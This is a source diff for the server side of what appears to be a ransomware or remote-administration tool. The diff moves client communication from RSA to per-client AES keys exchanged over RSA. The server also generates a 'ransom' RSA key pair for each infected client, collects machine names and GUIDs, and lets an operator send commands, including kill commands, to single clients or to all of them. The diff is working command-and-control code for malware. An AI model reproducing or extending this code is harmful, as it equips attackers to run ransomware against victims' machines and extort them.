@@ -85,7 +85,7 @@ ServerInterface::~ServerInterface() {
  * \param cuid - the client unique identifier of the client to exchange keys with
  * \return TRUE or FALSE whether or not keys were exchanged successfully.
  */
-bool ServerInterface::ExchangePublicKeys(long cuid) {
+bool ServerInterface::ExchangeCryptoKeys(long cuid) {
     Client* client = GetClientPtr(cuid);
     if ( !client )
         return false;
@@ -132,7 +132,14 @@ bool ServerInterface::ExchangePublicKeys(long cuid) {
 
     client->ClientPublicKey = rsaPubKey;
 
-    std::cout << "got client public rsa key!\n";
+    // send aes key encoded with base64 and encrypted with client public key
+    std::string base64Aes      = macaron::Base64::Encode(Serialization::BytestringToString(client->GetAESKey()));
+    BYTESTRING serialized      = Serialization::SerializeString(base64Aes);
+    BYTESTRING encryptedB64AES = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
+    m_NetworkManager.TransmitData(encryptedB64AES, client->GetSocket(), TCP);
+
+    std::cout << "Exchanged keys with client." << std::endl;
+
     free(data);
     free(clientDer);
     return true;
@@ -386,14 +393,7 @@ void ServerInterface::OnKeepAliveEcho(long cuid, BYTESTRING receivedEncrypted) {
     if ( !client )
         return;
 
-    BYTESTRING receivedDecrypted = LGCrypto::RSADecrypt(receivedEncrypted, this->m_SessionKeys.priv, TRUE);
-    if ( !LGCrypto::GoodDecrypt(receivedDecrypted) ) {
-        client->KeepAliveSuccess = FALSE;
-        client->KeepAliveProcess = FALSE;
-        return;
-    }
-
-    Packet echoed = Serialization::DeserializeToStruct<Packet>(receivedDecrypted);
+    Packet echoed = LGCrypto::DecryptToStruct<Packet>(receivedEncrypted, client->GetAESKey());
 
     if ( echoed.action == kKeepAlive ) {
         client->KeepAliveProcess = FALSE;
@@ -412,7 +412,7 @@ void ServerInterface::SendKeepAlivePackets(long cuid) {
     do {
         client->KeepAliveSuccess = FALSE;
 
-        BYTESTRING encryptedOriginal = LGCrypto::RSAEncrypt(Serialization::SerializeStruct(CreateKeepAlivePacket()), client->ClientPublicKey, FALSE);
+        BYTESTRING encryptedOriginal = LGCrypto::EncryptStruct(CreateKeepAlivePacket(), client->GetAESKey(), LGCrypto::GenerateAESIV());
 
         m_NetworkManager.SetSocketTimeout(client->GetSocket(), ReadConfig().keepAliveTimeoutMs, SO_SNDTIMEO);
         BOOL sent = m_NetworkManager.TransmitData(encryptedOriginal, client->GetSocket(), TCP);
@@ -482,12 +482,8 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
             OnKeepAliveEcho(client->ClientUID, encrypted);
             continue;
         }
-
-        decrypted = LGCrypto::RSADecrypt(encrypted, this->m_SessionKeys.priv, TRUE);
-        if ( !LGCrypto::GoodDecrypt(decrypted) )
-            continue;
-
-        request = Serialization::DeserializeToStruct<ClientRequest>(decrypted);
+        
+        request = LGCrypto::DecryptToStruct<ClientRequest>(encrypted, client->GetAESKey());
 
         std::cout << "Received request" << std::endl;
 
@@ -533,13 +529,15 @@ void ServerInterface::AcceptTCPConnections() {
  * \param incoming - incoming network address from the client
  */
 void ServerInterface::OnTCPConnection(SOCKET connection, sockaddr_in incoming) {
-    Client client(connection, incoming);                  // create the client. generate the cuid
-    RSAKeys ransomKeys = LGCrypto::GenerateRSAPair(4096); // generate rsa keys for the client
+    Client     client(connection, incoming);                  // create the client. generate the cuid
+    RSAKeys    ransomKeys = LGCrypto::GenerateRSAPair(4096); // generate rsa keys for the client
+    BYTESTRING aesKey     = LGCrypto::Generate256AESKey();
+    
     client.SetRansomSecrets(ransomKeys);
-    client.Alive = TRUE;
+    client.SetAESKey(aesKey);
     
     AddToClientList(client);              // add them to the client list
-    ExchangePublicKeys(client.ClientUID); // send server public key, get their public key
+    ExchangeCryptoKeys(client.ClientUID); // send server public key, get their public key
 
     GetClientComputerName(client.ClientUID);
     GetClientMachineGUID(client.ClientUID);
@@ -685,9 +683,9 @@ void ServerInterface::RunUserInputOnClients() {
         Client*      client        = nullptr;
         BOOL         performed     = FALSE;
         BOOL         globalCommand = FALSE; // perform command on all clients
+        RemoteAction lCommand      = kNone;
+        BOOL         sent          = FALSE;
         std::string  command;
-        RemoteAction lCommand = kNone;
-        BOOL         sent      = FALSE;
 
         std::cout << "[Client ID to perform command on; 0 for all]: ";
         std::getline(std::cin, clientID);
@@ -740,7 +738,7 @@ void ServerInterface::RunUserInputOnClients() {
             system("cls");
             continue;
         }
-
+         
         Packet toSend;
         BOOL userInput = HandleUserInput(lCommand, toSend); // fill packet with info
         if ( !userInput ) {
@@ -749,11 +747,12 @@ void ServerInterface::RunUserInputOnClients() {
             system("cls");
             continue;
         }
-
-        BYTESTRING serialized = Serialization::SerializeStruct(toSend);
+        std::cout << toSend.buffer << std::endl;
+        std::cout << toSend.buffLen << std::endl;
 
         if ( !globalCommand ) {
-            BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
+            BYTESTRING encrypted = LGCrypto::EncryptStruct(toSend, client->GetAESKey(), LGCrypto::GenerateAESIV());
+
             sent = m_NetworkManager.TransmitData(encrypted, client->GetSocket(), TCP);
 
             if ( toSend.action == kKillClient )
@@ -764,12 +763,17 @@ void ServerInterface::RunUserInputOnClients() {
                 if ( host.Alive == FALSE )
                     continue;
 
-                BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, host.ClientPublicKey, FALSE);
+                BYTESTRING encrypted = LGCrypto::EncryptStruct(toSend, host.GetAESKey(), LGCrypto::GenerateAESIV());
+
                 sent = m_NetworkManager.TransmitData(encrypted, host.GetSocket(), TCP);
 
                 if ( toSend.action == kKillClient ) {
                     Sleep(100);
                     RemoveClientFromServer(&host);
+                }
+
+                if ( toSend.action & RESPOND_WITH_STATUS ) {
+                    // TODO: receive response logic....
                 }
             }
             this->m_ClientListMutex.unlock();
@@ -928,17 +932,16 @@ bool ServerInterface::StartServer(Server& server) {
  */
 ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
     Client* client = GetClientPtr(cuid);
-    if ( client == nullptr ) return {};
+    if ( !client ) 
+        return {};
 
     client->ExpectingResponse = TRUE;
-    BOOL received = FALSE;
 
     BYTESTRING encrypted;
-    BYTESTRING decrypted;
     ClientResponse response;
     
     m_NetworkManager.SetSocketTimeout(client->GetSocket(), 10000, SO_RCVTIMEO);
-    received = m_NetworkManager.ReceiveData(encrypted, client->GetSocket(), TCP);
+    bool received = m_NetworkManager.ReceiveData(encrypted, client->GetSocket(), TCP);   
     m_NetworkManager.ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);
 
     if ( WSAGetLastError() == WSAETIMEDOUT ) {
@@ -949,12 +952,13 @@ ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
     if ( !received )
         return {};
 
-    decrypted = LGCrypto::RSADecrypt(encrypted, this->m_SessionKeys.priv, TRUE);
-    if ( !LGCrypto::GoodDecrypt(decrypted) )
-        return {};
+    BYTESTRING iv(encrypted.end() - IV_SIZE, encrypted.end());
+    BYTESTRING extract(encrypted.begin(), encrypted.end() - IV_SIZE);
+    BYTESTRING decrypted = LGCrypto::AESDecrypt(extract, client->GetAESKey(), iv);
 
     response = Serialization::DeserializeToStruct<ClientResponse>(decrypted);
     client->ExpectingResponse = FALSE;
+
 
     return response;
 }
@@ -1018,7 +1022,9 @@ ClientResponse ServerInterface::PingClient(long cuid) {
     pingCommand.buffLen = 0;
 
     std::cout << "Pinging " << client->GetDesktopName() << " with " << sizeof(pingCommand) << " bytes of data." << std::endl;
-    BOOL sent = m_NetworkManager.TransmitData(pingCommand, client->GetSocket(), TCP, NULL_ADDR, true, client->ClientPublicKey, false);
+    BYTESTRING encrypted = LGCrypto::EncryptStruct(pingCommand, client->GetAESKey(), LGCrypto::GenerateAESIV());
+
+    BOOL sent = m_NetworkManager.TransmitData(encrypted, client->GetSocket(), TCP);
     if ( !sent )
         return {};
 
